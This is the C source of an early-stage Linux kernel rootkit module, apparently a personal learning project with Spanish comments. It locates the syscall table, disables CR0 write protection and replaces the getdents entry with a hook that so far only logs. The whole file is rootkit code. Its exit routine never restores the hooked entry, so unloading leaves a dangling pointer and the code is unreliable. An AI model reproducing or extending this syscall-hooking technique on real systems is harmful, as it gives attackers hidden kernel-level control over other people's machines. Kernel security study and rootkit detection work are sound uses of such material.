#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h> // __NR_syscall
#include <asm/paravirt.h> // write_cr0

#include "helper.h"

#define ENABLE_WRITE() write_cr0(read_cr0() & (~(1<<16)));
#define DISABLE_WRITE() write_cr0(read_cr0() | (1<<16));

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Klecko");
MODULE_DESCRIPTION("Rootkit by Klecko");
MODULE_VERSION("0.1");


void** syscall_table;

typedef asmlinkage long (*sys_getdents_t)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
sys_getdents_t original_sys_getdents = NULL;

asmlinkage long sys_getdents_hook(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count){
	printk(KERN_INFO "ROOTKIT Hello from sys_getdents\n");
	return original_sys_getdents(fd, dirent, count);
}

/*void enable_write(){
	//pone cr0 igual que estaba pero con el bit de read only a 0
	write_cr0(read_cr0() & (~(1<<16)));
}

void disable_write(){
	//pone cr0 igual que estaba pero con el bit de read only a 1
	write_cr0(read_cr0() | (1<<16));
}*/


//__init para que solo lo haga una vez
int __init hooks(void){
	if ((syscall_table = (void **)kallsyms_lookup_name("sys_call_table")) == 0){
		printk(KERN_ERR "ROOTKIT ERROR: Syscall table not found!");
		return -1;
	}
	printk(KERN_INFO "ROOTKIT Syscall table found at %lx\n", (long unsigned int)syscall_table);
	printk(KERN_INFO "ROOTKIT Starting hooks\n");

	original_sys_getdents = syscall_table[__NR_getdents]; // OJO

	ENABLE_WRITE();
	syscall_table[__NR_getdents] = sys_getdents_hook;
	DISABLE_WRITE();

	printk(KERN_INFO "ROOTKIT Finished hooks\n");
	return 0;
}

//insmod
static int lkm_init(void){
    printk(KERN_INFO "ROOTKIT Starting Rootkit -----------------\n");
    return hooks();
}

//rmmod
static void lkm_exit(void){
    printk(KERN_INFO "ROOTKIT Finishing Rootkit ----------------\n");
}

module_init(lkm_init);
module_exit(lkm_exit);

